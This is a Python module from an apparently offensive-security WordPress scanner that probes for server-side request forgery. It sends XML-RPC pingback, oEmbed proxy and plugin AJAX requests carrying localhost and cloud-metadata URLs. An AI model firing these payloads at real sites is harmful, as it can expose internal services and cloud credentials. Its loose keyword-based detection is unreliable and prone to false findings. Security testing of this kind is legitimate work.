"""
WPHunter - SSRF Scanner
========================
Server-Side Request Forgery vulnerability detection.

WordPress SSRF vectors:
- XML-RPC pingback (CVE-2013-0235)
- oEmbed proxy
- Plugin image imports
- Webhook/callback features

CWE-918: Server-Side Request Forgery
"""

import asyncio
import re
from dataclasses import dataclass
from typing import Dict, List, Optional
from urllib.parse import urljoin

from core.http_client import WPHttpClient
from core.logger import logger


@dataclass
class SSRFFinding:
    url: str
    vector: str
    payload: str
    evidence: str
    severity: str = "high"
    cwe: str = "CWE-918"
    
    def to_dict(self) -> Dict:
        return {
            "type": "SSRF", "url": self.url, "vector": self.vector,
            "payload": self.payload, "evidence": self.evidence[:300],
            "severity": self.severity, "cwe": self.cwe
        }


class SSRFScanner:
    """
    WordPress SSRF vulnerability scanner.
    
    Tests known SSRF vectors in WordPress core and common plugins.
    Uses callback-based detection when possible.
    """
    
    # Callback domains for SSRF detection (use your own for real testing)
    CALLBACK_PAYLOADS = [
        "http://127.0.0.1:80",
        "http://localhost:80",
        "http://[::1]:80",
        "http://0.0.0.0:80",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",           # GCP metadata
        "http://100.100.100.200/latest/meta-data/",   # Alibaba
    ]
    
    def __init__(self, http_client: WPHttpClient, callback_url: Optional[str] = None):
        self.http = http_client
        self.callback_url = callback_url  # Your Burp Collaborator/interactsh URL
        self.findings: List[SSRFFinding] = []
    
    async def scan(self) -> List[SSRFFinding]:
        """Run all SSRF detection tests."""
        logger.section("SSRF Vulnerability Scan")
        
        # Test XML-RPC pingback SSRF
        await self._test_xmlrpc_pingback()
        
        # Test oEmbed SSRF
        await self._test_oembed_ssrf()
        
        # Test common plugin SSRF vectors
        await self._test_plugin_ssrf()
        
        logger.success(f"SSRF scan: {len(self.findings)} findings")
        return self.findings
    
    async def _test_xmlrpc_pingback(self):
        """
        Test XML-RPC pingback for SSRF (CVE-2013-0235).
        
        The pingback.ping method can be abused to make the server
        send requests to arbitrary URLs.
        """
        logger.info("Testing XML-RPC pingback SSRF...")
        
        # First check if XML-RPC is enabled
        try:
            response = await self.http.get("/xmlrpc.php")
            if response.status_code == 405 or "XML-RPC server accepts POST" in response.text:
                # XML-RPC is enabled, test pingback
                
                # Get a valid post URL from the site
                home_response = await self.http.get("/")
                post_urls = re.findall(
                    r'href="([^"]+/\d{4}/\d{2}/[^"]+)"',
                    home_response.text
                )
                
                target_url = post_urls[0] if post_urls else self.http.base_url + "/"
                
                for payload_url in self.CALLBACK_PAYLOADS[:3]:
                    xml_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
                    <methodCall>
                        <methodName>pingback.ping</methodName>
                        <params>
                            <param><value><string>{payload_url}</string></value></param>
                            <param><value><string>{target_url}</string></value></param>
                        </params>
                    </methodCall>'''
                    
                    try:
                        resp = await self.http.post(
                            "/xmlrpc.php",
                            data=xml_payload,
                            headers={"Content-Type": "text/xml"}
                        )
                        
                        # Check for SSRF indicators
                        if resp.ok:
                            # Successful pingback or error indicating connection attempt
                            if "faultCode" not in resp.text or "32" in resp.text:
                                # faultCode 32 = "The specified target URL cannot be used as a target"
                                # This means the server TRIED to connect
                                if "cannot be used" in resp.text.lower() or "源地址" in resp.text:
                                    self.findings.append(SSRFFinding(
                                        url="/xmlrpc.php",
                                        vector="pingback.ping",
                                        payload=payload_url,
                                        evidence="Server attempted connection to internal URL",
                                        severity="high"
                                    ))
                                    logger.vuln("high", f"SSRF via XML-RPC pingback: {payload_url}")
                                    return
                    except Exception:
                        continue
                        
        except Exception as e:
            logger.debug(f"XML-RPC pingback test failed: {e}")
    
    async def _test_oembed_ssrf(self):
        """
        Test oEmbed proxy for SSRF.
        
        WordPress fetches oEmbed data from external URLs which can
        be abused for SSRF.
        """
        logger.info("Testing oEmbed SSRF...")
        
        # Test wp-json oembed proxy
        for payload_url in self.CALLBACK_PAYLOADS[:2]:
            endpoints = [
                f"/wp-json/oembed/1.0/proxy?url={payload_url}",
                f"/?oembed=true&url={payload_url}",
            ]
            
            for endpoint in endpoints:
                try:
                    response = await self.http.get(endpoint)
                    
                    # Skip auth-blocked responses (not exploitable without auth)
                    if response.status_code in [401, 403]:
                        continue
                    
                    # Skip 404s
                    if response.status_code == 404:
                        continue
                    
                    # Check for SSRF indicators - server actually tried to connect
                    if response.status_code == 200:
                        # Look for signs the server tried to fetch the URL
                        content = response.text.lower()
                        ssrf_indicators = [
                            "connection refused",  # Server tried to connect
                            "couldn't connect",    # curl error
                            "timeout",             # Connection timeout
                            "no route to host",    # Network unreachable
                            "name resolution",     # DNS lookup attempted
                        ]
                        
                        if any(indicator in content for indicator in ssrf_indicators):
                            self.findings.append(SSRFFinding(
                                url=endpoint.split("?")[0],
                                vector="oEmbed proxy",
                                payload=payload_url,
                                evidence=response.text[:200],
                                severity="medium"
                            ))
                            logger.vuln("medium", f"SSRF confirmed via oEmbed")
                            return
                except Exception:
                    continue
    
    async def _test_plugin_ssrf(self):
        """
        Test common plugin SSRF vectors.
        """
        logger.info("Testing plugin SSRF vectors...")
        
        # Common vulnerable endpoints in plugins
        plugin_endpoints = [
            # Social sharing plugins
            ("/wp-admin/admin-ajax.php", {"action": "fetch_url", "url": "http://127.0.0.1"}),
            # Image optimization plugins
            ("/wp-admin/admin-ajax.php", {"action": "smush_async", "url": "http://127.0.0.1/test.jpg"}),
            # Import plugins
            ("/wp-admin/admin-ajax.php", {"action": "import_url", "url": "http://127.0.0.1"}),
            # Webhook plugins
            ("/wp-admin/admin-ajax.php", {"action": "send_webhook", "url": "http://127.0.0.1"}),
        ]
        
        for endpoint, params in plugin_endpoints:
            try:
                response = await self.http.post(endpoint, data=params)
                
                # Check for connection indicators
                if response.ok and len(response.text) > 0:
                    if any(indicator in response.text.lower() for indicator in 
                           ["connection", "refused", "timeout", "curl", "fetched"]):
                        self.findings.append(SSRFFinding(
                            url=endpoint,
                            vector=f"AJAX action: {params.get('action')}",
                            payload=str(params),
                            evidence=response.text[:200],
                            severity="medium"
                        ))
                        logger.vuln("medium", f"Potential SSRF in {params.get('action')}")
            except Exception:
                continue
    
    def get_summary(self) -> Dict:
        return {
            "total": len(self.findings),
            "by_vector": {},
            "findings": [f.to_dict() for f in self.findings]
        }
